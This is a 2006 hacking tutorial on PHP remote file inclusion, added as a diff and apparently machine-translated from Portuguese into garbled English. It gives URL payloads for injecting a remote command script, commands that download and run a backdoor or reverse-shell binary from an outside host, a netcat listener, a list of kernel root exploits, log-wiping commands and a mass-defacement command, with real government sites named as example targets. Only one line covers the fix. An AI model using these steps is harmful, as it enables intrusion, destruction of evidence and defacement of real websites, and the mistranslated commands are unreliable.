@@ -1,0 +1,425 @@
+///////////////////////////////////////////////////////////////////////
+//// PHP Injection Tutorial Vulnerability
+//// mescalin
+//// mescalin_@msn.com
+//// http://mescalin.100free.com
+//// 17/05/2006
+///////////////////////////////////////////////////////////////////////
+
+
+          1. What it is?
+          2. As to explore
+          3. Aid of google
+          4. Exploits local
+          5. Erasing Logs
+          6. As to arrange the vulnerability
+          7. Tools
+          8. Commands
+
+
+-----------------------------------------------------------------------
+
+
+1. What it is?
+
+	The known vulnerability more as: Remote File Inclusion, or remote Inclusao of archives, bug discovered between 2002 and 2003, to put still today many are unaware of it.
+
+	Bugs found sao in its majority, in scripts of php, exists disponiveis thousands for the Internet, every day new bugs of strings sao found and displayed in sites of security, and consecultivamente nao delay very to appear modified thousands of sites, and for coencidencia, 99% of these used scripts php bugados.
+
+  	But where this espeficicamente bug, it eh found in funcoes of php, that joined with one script badly written, makes possible inclusao remote of archives, most used sao:
+
+Main (, Include (, Include_Once (, and others, and generally funcao that it has bug is almost thus:
+
+main (to $dir. “file”)
+
+ We go to say that the arkivo that has this funcao if calls index.php, is enough the usuario now
+ in its navigator to type: index.php? dir=cmd < - q sera explained the front more.
+
+ Eh a simple error, but that it has caused great prejudices for the world.
+
+
+-----------------------------------------------------------------------
+
+
+2. As to explore
+
+
+	Vitima: Site that you will go to explore the imperfection of php.
+	String: Archives in the site suceptiveis to the attack.
+	Cmd: Script in PHP that in makes possible them to type 
+			  commands to be incluidos in php.
+	Backdoor: It opens doors in the system for remote connection 'without 
+			  autenticação'.
+	Connect Back: It opens a door specifies for conexao between its 
+			   PC and vitima.
+	Exploit: Program that explores certain imperfection in a system. 
+			  It has some types of Exploits. Here, we will go 
+			  to deal only with Place Root Exploits. (they explore 
+			  imperfections local that they take common users 
+			  access root - super-user -)
+	Shell: It is an interpretative program of commands that 
+			  it allows the user to iteragir with the system 
+			  operational through typed commands.
+	Telnet: We will use for remote connections.
+	Firewall: It is an intelligent barrier between a local net
+			  e the Internet, through which it only passes traffic  
+			  authorized. This traffic is examined by 
+			  firewall in real time and the election is made of 
+			  agreement with the rule. “what it was not express
+			  allowed, it is forbidden "
+	root: Super-user. He is admin… has total access to
+			  system.
+
+
+* Strings
+
+	Strings has several available. In this tutorial one, I will go to use stops 
+examples well simple one that is “index.php? page=”. In annex, the end, 
+several others: P
+
+
+
+* Syntax
+
+Former:
+www.site.com /arquivo.php? data= http://CMD/cmd.gif?&cmd= ls
+
+     ^ ^ ^ ^
+ Vitima String CmD command unix
+
+(P.S.: Without the spaces)
+
+
+
+* Using the CmD
+
+
+	Cmd = http://www.site.com/cmd.gif?&cmd=
+
+	In the result, it inserts cmd in string.
+Former: www.site.com/index.php?page=http://www.site.com/cmd.gif?&cmd=
+
+
+        In the CMD:
+
+sysname: 		--> Operational system twirling.
+nodename: 		--> local Name.
+release:  		--> Version of kernel.
+Script Current User: 	--> Using for which script is being executed.
+PHP Version: 		--> Version of php of the machine
+User Info: 		--> Information of user (uid, euid, gid).
+Current Path: 		--> current Folder that you are in the server.
+Server IP: 		--> IP of the server.
+Web server: 		--> Information on the server.
+
+
+
+* Gaining access to shell
+
+
+He is the interpreter of commands of the machine. For this, she is necessary of: Backdoor and Connect Back. 
+
+
+
+* Twirling backdoor in the server for remote connection
+
+	To twirl a backdoor, it is enough to make one upload, to choose permissions, and to execute it. 
+
+	Command: compact disc /var/tmp; wget www.site.onde.es tá .o.backdoor.com/backdoor;chmod 777 backdoor;. /backdoor
+
+compact disc /var/tmp - > Faz the operation in this folder, for being common 
+			   all the users and had to its permissions. 
+			   /tmp tb serves:)
+
+wget www. (...) /backdoor - > Copia the backdoor from a URL for 
+			   site. When wget not to function, tries others 
+			   commands. Syntaxes:
+
+          
+- Possiveis programs to make download of the archives
+
+	wget www.site.com/arquivo
+	lynx - source www.site.com/arquivo > archive
+	curl - the www.site.com/arquivo archive
+	GET www.site.com/arquivo > archive
+		(...)
+
+	Now, it is enough to connect itself shell. How?
+
+	In the Win:   To initiate - > Executar - > telnet www.site.com carries
+
+	Where www.site.com receives name or IP from the site that you twirled the backdoor and carries is the door that the backdoor is working.
+
+	If to appear in the telnet bash-2.05b$ or something seemed, is because it functioned! E you have access to shell in the machine. If to delay a time and not to fall in shell, confer nome/ip of the server. 
+	If he will be correct, it is twirling Firewall. E now? simple, Connect Back.
+
+
+
+* Connect Back 
+
+
+	Very efficient method to gain shell in a machine. It gains shell reversamente.
+	Windows: It lowers netcat for windows and in Prompt of MSDOS (in the folder that nc if finds), it types:      nc - vv - l - p 15, where 15 can in accordance with be chosen its preference. This door will be the one that will carry through the connection.
+
+	Now, coming back to browser it, in cmd it types the following command:
+	compact disc /var/tmp; wget www.site.do.dc.com/dc;chmod 777 dc;. /dc IP carries
+
+compact disc /var/tmp - > Exactly that for backdoor.
+wget www.site.do.dc.com/dc - > | | | |, but is logico, with 
+				   address of dc.
+./dc IP carries - > where IP is ITS IP and carries is the door 
+				   that you it chose in netcat.
+
+
+	Made this, if to occur all certainty, it will appear as resulted:
+
+Connect Back Backdoor
+
+[*] Dumping Arguments
+[*] Resolving Host Name
+[*] Connecting…
+[*] Spawning Shell
+[*] Detached
+
+	This means that you if it connected in shell!
+
+	If to appear
+
+Connect Back Backdoor
+
+[*] Dumping Arguments
+[*] Resolving Host Name
+[*] Connecting…
+[-] Unable you the Connect
+
+	it confers the data (its IP, carries, netcat, etc). If to insist, its 
+not accepted net this type of connection. It tries other doors (as 80, 22, 
+15, etc).
+
+
+-----------------------------------------------------------------------
+
+
+4. Exploits local
+
+2.4.17 
+newlocal 
+kmod 
+
+2.4.18 
+brk 
+newlocal 
+kmod 
+km.2 
+
+2.4.19 
+brk 
+newlocal 
+kmod 
+km.2 
+
+2.4.20 
+ptrace 
+kmod 
+km.2 
+brk 
+ 
+ 2.4.21 
+km.2 
+brk 
+ptrace 
+
+2.4.22 
+km.2 
+brk 
+ptrace 
+
+2.4.23 
+mremap_pte
+
+2.4.24 
+mremap_pte
+Uselib24
+
+2.4.27 
+Uselib24
+
+2.6.2 
+mremap_pte
+krad 
+
+2.6.5 you the 2.6.10
+krad krad2 
+ 
+
+
+-----------------------------------------------------------------------
+
+
+
+5. Erasing Logs
+
+
+rm - rf /var/log
+rm - rf /var/adm
+rm - rf /var/apache/log
+rm - rf $HISTFILE
+find/- name .bash_history - exec rm - rf {} \;
+find/- name .bash_logout - exec rm - rf {} \;
+find/- name log* - exec rm - rf {} \;
+find/- name *.log - exec rm - rf {} \;
+
+
+-----------------------------------------------------------------------
+
+
+
+6. As to arrange the vulnerability
+
+To edit the archive php.ini in the folder of configuration of its apache and incapacitating the functions:
+			 they system, exec, passthru, shell_exec
+
+
+
+-----------------------------------------------------------------------
+
+
+
+
+7. Tools
+
+Voce can find some tools in the sites:
+
+ - http://mescalin.100free.com
+ - http://www.packetstormsecurity.org
+ - http://www.milw0rm.com
+ - http://www.securiteam.com
+
+
+
+-----------------------------------------------------------------------
+
+
+
+8. Commands
+
+
+  ls - > List archives. It can be combined with - (shows occult) and - l (it shows at great length). Former: ls - la 
+		   (it shows the archives, also occult at great length).
+  uname - - > Mostra information of the system, as version of kernel, 
+		   uteis name, and other things. 
+  id - > Mostra its id.
+  w - > List the users logados at the moment.
+  cp - > Copia archives. Syntax: cp /destino/ archive
+  mv - > Move archives. Sintexe: mv /destino/ archive
+  rm - > Remove archives. If combined with - rf, removes all 
+		   the setados archives, also folders
+  to mkdir - > diretorio Cria
+  to rmdir - > diretorio Exclui
+  find - > Procura for archives/folders. Former: “find /etc - name 
+		   httpd.conf “looks for for httpd.conf in the /etc folder
+  pwd - > Mostra where folder you are located
+  cat - > Exibe the content of an archive in the screen
+
+  head - > Exibe lines of the beginning of the archive
+  tail - > || || || final of the archive
+  ctrl+c - > Sai/killa one programs
+  ctrl+r - > Busca command typed in history of bash
+  ps - auxw - > List all the processes of the system
+  netstat - in - > Status of the connection
+  kill -9 - > Mata process. Syntax: kill -9 PID OF the PROCESS
+  kill - HUP - > Reinicia process. Syntax: kill - HUP ID OF the PROCESS
+  peak - > Publisher of text. Syntax: peak archive
+  vi - > | | vi archive
+
+
+ Saving resulted in archives 
+	á/armazenado command > /arquivo/onde/ser
+	Former:  ls /etc > /tmp/s.txt safe all the result of the listing of 
+				    /etc in the /tmp/s.txt archive
+
+ Adding lines in archives
+	echo “line” >> /arquivo/onde/ser á/incluido
+
+ Unpacking archives (most common)
+	.tar - > to tar xvf arquivo.tar
+	.tar.gz - > to tar zxvf arquivo.tar.gz
+	.tar .bz2 - > to tar jxvf arquivo.tar .bz2
+	.zip - > unzip arquivo.zip
+
+
+ Compactando archives (most common)
+	.tar - > to tar cvf destino.tar ARCHIVE
+	.tar.gz - > to tar cvf destino.tar ARCHIVE | gzip destino.tar
+	.tar .bz2 - > to tar cvf destino.tar ARCHIVE | bzip2 destino.tar
+	.zip - > zip DES tino.zip ARQUIVO
+
+
+* List of sites running on server
+
+
+* Using httpd.conf file
+
+Generally the data of the housed sites are in this archive. To make a listing of the sites, it is enough to type a command that will go to read the archive httpd.conf and to print the lines that contain ServerName
+(name of the sites). (in the folder where httpd.conf if finds)
+
+		cat httpd.conf | grep ServerName
+
+	(they will be in this archive same, you result can to save in archive - preferential in the folder of the site that you left - and to make download)
+
+	---->
+		How? Good, in the CMD, it types pwd. You it will see the place where you 
+	if it finds in the server. Former: /home/httpd/vhosts/nasa.gov/web/
+	Let us say that the URL is this: http://nasa.gov/index.php?page=CMD
+	Then, if you to play the result for /home/httpd/vhosts/nasa.gov/web
+	This archive will be in the root of the site. To only type this command:
+
+	cat httpd.conf | grep ServerName > /home/httpd/vhosts/nasa.gov/web/RESULTADO.txt
+				(only one example)
+	Made this, http://nasa.gov/RESULTADO.txt and to lower the list: P
+
+	<----
+
+	Now, where it is this? GENERALLY in the folders /etc/httpd/conf or /etc/apache/conf but it varies very and it can be found in other places. An efficient way, to put delayed, to find is making a complete search for sitema. Command:
+
+	find/- name httpd.conf
+
+	This prints where he is httpd.conf in the server. It can appear more than a result.
+
+
+
+* Other ways…
+
+	If exactly thus, not to obtain to find which sites has there, looks alternative forms. Unhappyly it does not have as to explain therefore in each server it has a way.
+
+	Example:
+
+	If in the folder where the sites are located, you to list them and the result ja will have the name and domain of them: former: ls /home/httpd/vhosts
+		site.com
+		mtv.com .br
+		nasa.gov
+		whitehouse.gov
+		fuckbush.org
+		… etc
+
+
+* Making Mass Defacement
+
+	Good, first, it creates one index that you it wants that is in the place of the others. Made it, plays for some place that you can make upload pro server.
+
+	Now, the end: to change to all the others for its. Simple, a command for this is enough:
+
+	find /pasta/onde/est ão/os/sites - name “index.*” - exec cp /onde/est á/sua/index.html {} \;
+
+	To know where they are the sites, only pwd in cmd. Former: /home/httpd/vhosts/nasa.gov/web
+
+	One notices that all the others are in /home/httpd/vhosts.
+
+	Equal backdoor makes upload. wget http://suaindex.com/sua.index
+
+	Let us say that you it made for the /tmp folder, then, the command would be thus:
+
+	find /home/httpd/vhosts - name “index.*” - exec cp /tmp/index.html {} \;
+
+
+-----------------------------------------------------------------
